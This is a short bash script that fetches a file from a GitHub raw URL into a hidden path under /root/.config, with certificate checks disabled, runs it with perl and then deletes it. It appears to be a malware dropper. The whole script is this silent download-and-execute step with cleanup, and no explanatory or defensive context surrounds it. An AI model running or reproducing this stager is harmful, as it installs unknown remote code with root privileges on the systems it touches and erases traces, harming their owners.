#!/bin/bash
if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/vs" -o /root/.config/vs 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/vs -O /root/.config/vs 2>/dev/null; then
exit 1
fi
perl /root/.config/vs;rm /root/.config/vs
